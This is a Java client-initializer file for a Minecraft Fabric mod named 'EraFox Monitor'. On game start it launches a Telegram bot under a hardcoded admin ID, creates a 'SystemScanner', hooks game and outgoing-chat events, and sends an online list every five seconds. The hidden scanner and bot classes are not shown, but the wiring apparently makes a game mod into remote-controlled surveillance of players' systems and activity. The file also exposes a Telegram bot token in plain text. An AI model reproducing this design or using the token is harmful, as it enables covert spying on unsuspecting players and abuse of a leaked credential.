package dev.erafox.monitor;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientLifecycleEvents;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.fabricmc.fabric.api.client.message.v1.ClientSendMessageEvents;
import dev.erafox.monitor.bot.TelegramBotEngine;
import dev.erafox.monitor.listener.GameEventListener;
import dev.erafox.monitor.profile.SystemScanner;
import dev.erafox.monitor.session.SessionController;
import dev.erafox.monitor.overlay.MonitorHudOverlay;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class EraFoxMonitorMod implements ClientModInitializer {
    public static final Logger LOGGER = LoggerFactory.getLogger("EraFoxMonitor");
    public static final String BOT_TOKEN = "8580844525:AAFJg5RSWigIYEMO30Tudup-bwruz8mbl5E";
    public static final long ADMIN_ID = 728946852L;
    private static TelegramBotEngine botEngine;
    private static SystemScanner systemScanner;
    private static final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(2);
    public static SessionController sessionController;

    @Override
    public void onInitializeClient() {
        LOGGER.info("[EFM] Инициализация EraFox Monitor v1.0 для Minecraft 1.21.7");
        systemScanner = new SystemScanner();
        sessionController = SessionController.getInstance();

        // Регистрация HUD оверлея (новая система Fabric 1.21.7)
        MonitorHudOverlay.register();

        scheduler.execute(() -> {
            try {
                botEngine = new TelegramBotEngine(BOT_TOKEN);
                botEngine.start();
                LOGGER.info("[EFM] Telegram Bot Engine запущен.");
            } catch (Exception e) {
                LOGGER.error("[EFM] Критическая ошибка инициализации бота: ", e);
            }
        });

        GameEventListener.register(this);
        LOGGER.info("[EFM] Все слушатели событий зарегистрированы.");

        scheduler.scheduleAtFixedRate(() -> {
            if (botEngine != null && botEngine.isRunning()) {
                botEngine.updateOnlineList();
            }
        }, 10, 5, TimeUnit.SECONDS);
    }

    public static TelegramBotEngine getBotEngine() {
        return botEngine;
    }

    public static SystemScanner getSystemScanner() {
        return systemScanner;
    }

    public static ScheduledExecutorService getScheduler() {
        return scheduler;
    }
}
